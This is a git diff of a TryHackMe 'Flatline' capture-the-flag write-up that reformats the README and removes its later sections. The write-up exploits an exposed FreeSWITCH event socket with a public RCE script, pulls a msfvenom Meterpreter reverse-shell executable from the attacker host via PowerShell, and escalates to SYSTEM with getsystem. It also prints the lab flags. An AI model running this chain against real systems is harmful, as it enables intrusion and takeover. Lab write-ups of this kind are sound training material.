@@ -1,13 +1,12 @@
 # 🪟 TryHackMe — Flatline
 
+> **Room:** Flatline  |  **Platform:** TryHackMe  |  **Focus:** Network Enumeration, FreeSWITCH, Remote Command Execution, Windows Enumeration, Meterpreter, Privilege Escalation
+
 ![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-success?style=for-the-badge)
 ![Category](https://img.shields.io/badge/Category-Windows%20%7C%20RCE%20%7C%20Privilege%20Escalation-blue?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)
 
-> **Room:** Flatline  
-> **Platform:** TryHackMe  
-> **Focus:** Network Enumeration, FreeSWITCH, Remote Command Execution, Windows Enumeration, Meterpreter, Privilege Escalation
 
 ---
 
@@ -39,29 +38,6 @@ The Meterpreter session initially runs as the `Nekrotic` user. The built-in `get
 - Escalate from `Nekrotic` to `NT AUTHORITY\SYSTEM`.
 - Capture the root flag.
 
----
-
-# 🖥️ Target Information
-
-Target IP used in the screenshots:
-
-```text
-10.49.163.58
-```
-
-> **Note:** TryHackMe target IPs change between sessions. Replace `<TARGET_IP>` with the IP assigned to you.
-
-Attacker/Kali IP used in the screenshots:
-
-```text
-192.168.132.194
-```
-
-Replace it with your own Kali IP where required:
-
-```text
-<KALI_IP>
-```
 
 ---
 
@@ -107,22 +83,22 @@ Read root.txt
 
 The first step was to identify the open ports and services running on the target.
 
-### Command
 
 ```bash
 nmap -sV -Pn <TARGET_IP>
 ```
 
-### Screenshot
 
-![Nmap Enumeration](images/1.png)
+<img width="780" height="219" alt="1" src="https://github.com/user-attachments/assets/a0f55925-9d25-46c3-b3bb-3c75b0a44c37" />
 
 The scan identified two important open ports:
+```
+| Port |       Service    |            Description            |
+|------|------------------|-----------------------------------|
+| 3389 |    ms-wbt-server | Microsoft Terminal Services / RDP |
+| 8021 | freeswitch-event |   FreeSWITCH `mod_event_socket`   |
 
-| Port | Service | Description |
-|---|---|---|
-| 3389 | ms-wbt-server | Microsoft Terminal Services / RDP |
-| 8021 | freeswitch-event | FreeSWITCH `mod_event_socket` |
+```
 
 The target was identified as a Windows machine.
 
@@ -182,9 +158,7 @@ The exploit was used to execute a Windows `dir` command against the target.
 python3 47799.py <TARGET_IP> 'dir'
 ```
 
-### Screenshot
-
-![FreeSWITCH RCE](images/2.png)
+<img width="575" height="672" alt="2" src="https://github.com/user-attachments/assets/29090b0a-fb10-444e-9894-814c8750cc4a" />
 
 The response showed:
 
@@ -218,15 +192,11 @@ This confirmed that arbitrary Windows commands could be executed remotely throug
 
 After confirming command execution, the next step was to enumerate the Windows users.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'dir C:\Users'
 ```
 
-### Screenshot
-
-![Users Enumeration](images/3.png)
+<img width="488" height="306" alt="3" src="https://github.com/user-attachments/assets/3fd09f32-2aee-43f2-8f33-dfd692f01991" />
 
 The output showed:
 
@@ -250,15 +220,11 @@ was particularly interesting because the user's Desktop contained the flags.
 
 The `Nekrotic` user's home directory was examined.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'dir C:\Users\Nekrotic'
 ```
 
-### Screenshot
-
-![Nekrotic Directory](images/4.png)
+<img width="513" height="450" alt="4" src="https://github.com/user-attachments/assets/36dbc061-5c60-4cfe-9872-0aea52874ef0" />
 
 The directory contained the standard Windows profile folders:
 
@@ -287,15 +253,11 @@ C:\Users\Nekrotic\Desktop
 
 The Desktop directory was enumerated.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'dir C:\Users\Nekrotic\Desktop'
 ```
 
-### Screenshot
-
-![Desktop Enumeration](images/5.png)
+<img width="557" height="281" alt="5" src="https://github.com/user-attachments/assets/38161d30-38a8-4ca5-b729-0203300579ed" />
 
 The directory contained:
 
@@ -312,23 +274,13 @@ Both flags were present, but they did not necessarily have the same access permi
 
 The `user.txt` file was read using the Windows `type` command.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'type C:\Users\Nekrotic\Desktop\user.txt'
 ```
 
-### Screenshot
-
-![User Flag](images/6.png)
+<img width="628" height="132" alt="6" src="https://github.com/user-attachments/assets/01038675-1040-4915-a2bb-262b0b842814" />
 
 The user flag was:
-
-```text
-THM{64bca0843d535fa73eecd59d27cbe26}
-```
-
-### User Flag
 
 ```text
 THM{64bca0843d535fa73eecd59d27cbe26}
@@ -340,15 +292,11 @@ THM{64bca0843d535fa73eecd59d27cbe26}
 
 The same technique was used against the root flag.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'type C:\Users\Nekrotic\Desktop\root.txt'
 ```
 
-### Screenshot
-
-![Root Flag Access Attempt](images/7.png)
+<img width="627" height="128" alt="7" src="https://github.com/user-attachments/assets/28f32e10-26ca-4286-a04e-1968e20e8d60" />
 
 The response was:
 
@@ -366,19 +314,11 @@ This indicated that a more capable shell and/or higher privileges were required.
 
 To obtain an interactive Meterpreter session, a Windows x64 reverse TCP executable was generated with `msfvenom`.
 
-### Command
-
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-LHOST=<KALI_IP> \
-LPORT=443 \
--f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe > shell.exe
 ```
 
-### Screenshot
-
-![Payload Generation](images/8.png)
-
+<img width="850" height="204" alt="8" src="https://github.com/user-attachments/assets/3fe84058-6cce-40dd-a31c-508375f4b167" />
 The payload generated was:
 
 ```text
@@ -399,15 +339,11 @@ python3 -m http.server 8000
 
 The target was then instructed to download the payload using PowerShell.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'powershell Invoke-WebRequest -URI http://<KALI_IP>:8000/shell.exe -o C:\Users\Nekrotic\Desktop\shell.exe'
 ```
 
-### Screenshot
-
-![Payload Transfer](images/9.png)
+<img width="1191" height="458" alt="9" src="https://github.com/user-attachments/assets/b06e2097-a21b-4bb2-996d-19cf577b8f4d" />
 
 The exploit returned:
 
@@ -437,8 +373,6 @@ This confirmed that the payload was present on the target.
 
 A Metasploit multi/handler was configured to receive the Meterpreter connection.
 
-### Commands
-
 ```text
 use /multi/handler
 set LHOST <KALI_IP>
@@ -447,9 +381,7 @@ set payload windows/x64/meterpreter/reverse_tcp
 run
 ```
 
-### Screenshot
-
-![Metasploit Handler](images/10.png)
+<img width="863" height="214" alt="10" src="https://github.com/user-attachments/assets/ca6d7f67-27f0-40cc-a1be-b1915578f72d" />
 
 The handler started listening on:
 
@@ -469,15 +401,11 @@ windows/x64/meterpreter/reverse_tcp
 
 The uploaded `shell.exe` was executed through the same FreeSWITCH command-execution vulnerability.
 
-### Command
-
 ```bash
 python3 47799.py <TARGET_IP> 'C:\Users\Nekrotic\Desktop\shell.exe'
 ```
 
-### Screenshot
-
-![Payload Execution](images/10-1.png)
+<img width="597" height="54" alt="10-1" src="https://github.com/user-attachments/assets/2f1f49d7-c97f-4edc-b4de-95eb11018108" />
 
 The exploit authenticated successfully.
 
@@ -489,15 +417,11 @@ Once the payload connected back to the waiting Metasploit handler, a Meterpreter
 
 The first step after receiving the Meterpreter session was to determine the current user.
 
-### Command
-
 ```text
 getuid
 ```
 
-### Screenshot
-
-![Meterpreter getuid](images/11.png)
+<img width="358" height="41" alt="11" src="https://github.com/user-attachments/assets/db8885e7-c903-442b-a171-bb12de8baac9" />
 
 The result was:
 
@@ -521,15 +445,11 @@ The next step was to attempt privilege escalation.
 
 Meterpreter provides the `getsystem` command for attempting to elevate privileges on Windows.
 
-### Command
-
 ```text
 getsystem
 ```
 
-### Screenshot
-
-![Meterpreter getsystem](images/12.png)
+<img width="595" height="69" alt="12" src="https://github.com/user-attachments/assets/2a8db6b6-4d9b-4f89-b7b7-79f991db3f13" />
 
 The result was:
 
@@ -578,9 +498,7 @@ cd ..
 ls
 ```
 
-### Screenshot
-
-![Filesystem Enumeration](images/13.png)
+<img width="684" height="388" alt="13" src="https://github.com/user-attachments/assets/1e062cbe-4671-4972-bc92-c7079465965f" />
 
 The current location was initially:
 
@@ -616,9 +534,7 @@ cd Users
 ls
 ```
 
-### Screenshot
-
-![Users Directory](images/14.png)
+<img width="579" height="248" alt="14" src="https://github.com/user-attachments/assets/55dee822-dcf0-40b2-8f8a-e393de8a79c9" />
 
 The `Nekrotic` user directory was present.
 
@@ -629,9 +545,7 @@ cd Nekrotic
 ls
 ```
 
-### Screenshot
-
-![Nekrotic Directory](images/15.png)
+<img width="657" height="610" alt="15" src="https://github.com/user-attachments/assets/c73cb553-26a7-4c48-82d6-0a5d1b702e04" />
 
 The user's profile contained the Desktop directory.
 
@@ -647,16 +561,12 @@ C:\Users\Nekrotic\Desktop
 
 The Desktop directory was listed after obtaining SYSTEM privileges.
 
-### Command
-
 ```text
 cd Desktop
 ls
 ```
 
-### Screenshot
-
-![Root Flag](images/16.png)
+<img width="583" height="240" alt="16" src="https://github.com/user-attachments/assets/b8388b92-1bc0-453b-9e39-5459ed68bec5" />
 
 The Desktop contained:
 
@@ -677,362 +587,4 @@ The flag was:
 
 ```text
 THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
-```
-
-### Root Flag
-
-```text
-THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
-```
-
----
-
-# 🚩 Flags
-
-## User Flag
-
-```text
-THM{64bca0843d535fa73eecd59d27cbe26}
-```
-
-## Root Flag
-
-```text
-THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
-```
-
----
-
-# 🔗 Complete Attack Chain
-
-```text
-                    TARGET
-                      │
-                      ▼
-               Nmap Enumeration
-                      │
-                      ▼
-        8021/tcp — FreeSWITCH Event Socket
-                      │
-                      ▼
-             Search for Exploit
-                      │
-                      ▼
-                  47799.py
-                      │
-                      ▼
-          FreeSWITCH Command Execution
-                      │
-                      ▼
-            Windows Enumeration
-                      │
-                      ▼
-          C:\Users\Nekrotic\Desktop
-                      │
-               ┌──────┴──────┐
-               ▼             ▼
-           user.txt       root.txt
-               │             │
-               ▼             ▼
-           User Flag      Access Denied
-                              │
-                              ▼
-                   Generate shell.exe
-                              │
-                              ▼
-                    Transfer via PowerShell
-                              │
-                              ▼
-                     Execute shell.exe
-                              │
-                              ▼
-                     Meterpreter Session
-                              │
-                              ▼
-                           Nekrotic
-                              │
-                              ▼
-                         getsystem
-                              │
-                              ▼
-                    NT AUTHORITY\SYSTEM
-                              │
-                              ▼
-                          root.txt
-                              │
-                              ▼
-                         Root Flag
-```
-
----
-
-# 📊 Attack Chain Summary
-
-| Stage | Technique | Result |
-|---|---|---|
-| 1 | Nmap Enumeration | Discovered ports 3389 and 8021 |
-| 2 | Service Enumeration | Identified FreeSWITCH |
-| 3 | Exploit Research | Found FreeSWITCH command execution exploit |
-| 4 | RCE | Executed Windows commands remotely |
-| 5 | Windows Enumeration | Found `Nekrotic` user |
-| 6 | File Enumeration | Located `user.txt` and `root.txt` |
-| 7 | Flag Capture | Retrieved user flag |
-| 8 | Privilege Limitation | `root.txt` could not be read initially |
-| 9 | Payload Generation | Created Meterpreter `shell.exe` |
-| 10 | File Transfer | Downloaded payload to target |
-| 11 | Payload Execution | Obtained Meterpreter session |
-| 12 | User Enumeration | Confirmed `Nekrotic` |
-| 13 | Privilege Escalation | `getsystem` obtained SYSTEM |
-| 14 | Filesystem Enumeration | Navigated to Desktop |
-| 15 | Root Flag | Retrieved `root.txt` |
-
----
-
-# 🧠 Key Takeaways
-
-### 1. Enumerate unusual services
-
-Port 8021 was more interesting than the initially obvious RDP port.
-
-The service:
-
-```text
-FreeSWITCH mod_event_socket
-```
-
-provided the entry point into the machine.
-
----
-
-### 2. Service version information can lead directly to exploitation
-
-Once FreeSWITCH was identified, exploit research revealed a command-execution vulnerability affecting FreeSWITCH 1.10.1.
-
-The `47799.py` exploit allowed commands to be sent to the service remotely.
-
----
-
-### 3. RCE does not always mean you immediately have a full shell
-
-The initial exploit provided command execution, but reading `root.txt` directly was unsuccessful.
-
-A more interactive payload was therefore generated and executed to obtain a Meterpreter session.
-
----
-
-### 4. Windows command execution can be chained with PowerShell
-
-The vulnerable FreeSWITCH service was used to execute:
-
-```text
-powershell Invoke-WebRequest ...
-```
-
-This allowed the Meterpreter executable to be transferred onto the target.
-
----
-
-### 5. Always check the current security context
-
-After receiving the Meterpreter session:
-
-```text
-getuid
-```
-
-showed:
-
-```text
-WIN-EOM4PK0578N\Nekrotic
-```
-
-This confirmed that the session was not yet running as SYSTEM.
-
----
-
-### 6. `getsystem` successfully elevated privileges
-
-The Meterpreter command:
-
-```text
-getsystem
-```
-
-successfully used:
-
-```text
-Named Pipe Impersonation (In Memory/Admin)
-```
-
-to obtain:
-
-```text
-NT AUTHORITY\SYSTEM
-```
-
-This provided full administrative access to the Windows machine.
-
----
-
-# 🛡️ Mitigation Recommendations
-
-## Secure FreeSWITCH
-
-- Change default FreeSWITCH credentials.
-- Do not expose `mod_event_socket` directly to untrusted networks.
-- Restrict access to port 8021 using firewall rules.
-- Configure allowed IP ranges appropriately.
-- Keep FreeSWITCH updated.
-- Disable unnecessary remote management interfaces.
-
----
-
-## Secure Windows Services
-
-- Keep Windows and installed applications patched.
-- Remove unnecessary exposed services.
-- Restrict RDP access to trusted networks.
-- Apply least-privilege permissions to service accounts.
-- Monitor unusual process creation and outbound connections.
-
----
-
-## Prevent Privilege Escalation
-
-- Apply the principle of least privilege.
-- Restrict dangerous token privileges where possible.
-- Keep endpoint security protections enabled.
-- Monitor for suspicious named-pipe activity.
-- Ensure privileged services cannot be abused by low-privileged users.
-
----
-
-# 🧰 Tools Used
-
-```text
-Nmap
-SearchSploit
-Python
-47799.py
-msfvenom
-Metasploit Framework
-Meterpreter
-PowerShell
-```
-
----
-
-# 🎯 Skills Demonstrated
-
-- Network Enumeration
-- Service Enumeration
-- Windows Enumeration
-- FreeSWITCH Enumeration
-- Exploit Research
-- Remote Command Execution
-- Windows Command Execution
-- PowerShell
-- Payload Generation
-- Reverse Shells
-- Meterpreter
-- Privilege Escalation
-- Windows SYSTEM Access
-- Post-Exploitation
-- Flag Enumeration
-
----
-
-# 📸 Screenshot Directory
-
-Place the extracted screenshots in an `images` directory beside this README:
-
-```text
-Flatline/
-│
-├── README.md
-│
-└── images/
-    ├── 1.png
-    ├── 2.png
-    ├── 3.png
-    ├── 4.png
-    ├── 5.png
-    ├── 6.png
-    ├── 7.png
-    ├── 8.png
-    ├── 9.png
-    ├── 10.png
-    ├── 10-1.png
-    ├── 11.png
-    ├── 12.png
-    ├── 13.png
-    ├── 14.png
-    ├── 15.png
-    └── 16.png
-```
-
----
-
-# ⚠️ Disclaimer
-
-This write-up is intended for **educational and authorized security testing purposes only**.
-
-All exploitation techniques demonstrated here were performed against the intentionally vulnerable **TryHackMe Flatline** lab environment.
-
-Do not use these techniques against systems or services without explicit authorization.
-
----
-
-# 🏁 Conclusion
-
-The **Flatline** room demonstrated a straightforward but effective Windows attack chain.
-
-The initial Nmap scan revealed an exposed FreeSWITCH event socket on port 8021. After identifying the service, the `47799.py` command-execution exploit was used to obtain remote Windows command execution.
-
-The target was then enumerated using commands such as:
-
-```text
-dir
-```
-
-which revealed the `Nekrotic` user and the Desktop containing both flags.
-
-The user flag was retrieved directly, while the root flag could not initially be accessed. To obtain a more capable session, a Windows x64 Meterpreter payload was generated with `msfvenom`, transferred to the target using PowerShell, and executed through the existing RCE.
-
-The resulting Meterpreter session initially ran as:
-
-```text
-WIN-EOM4PK0578N\Nekrotic
-```
-
-The `getsystem` command successfully elevated the session to:
-
-```text
-NT AUTHORITY\SYSTEM
-```
-
-After obtaining SYSTEM privileges, the `root.txt` file could be read successfully.
-
-The complete compromise can therefore be summarized as:
-
-```text
-FreeSWITCH Exposure
-        ↓
-Command Execution
-        ↓
-Windows Enumeration
-        ↓
-User Flag
-        ↓
-Meterpreter Payload
-        ↓
-Meterpreter Session
-        ↓
-Nekrotic
-        ↓
-getsystem
-        ↓
-NT AUTHORITY\SYSTEM
-        ↓
-Root Flag
 ```
